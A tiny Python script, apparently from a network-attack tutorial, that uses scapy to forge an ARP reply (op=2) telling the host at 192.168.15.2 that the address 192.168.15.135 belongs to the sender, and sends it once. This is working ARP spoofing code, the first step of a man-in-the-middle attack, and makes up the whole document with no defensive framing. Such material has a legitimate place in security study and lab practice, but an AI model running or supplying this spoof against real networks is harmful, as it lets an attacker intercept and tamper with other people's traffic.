#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.15.2", hwdst="00:50:56:e2:4a:71", psrc="192.168.15.135")  # op=2 stands for
# the type of request
scapy.send(packet)  # send the packet



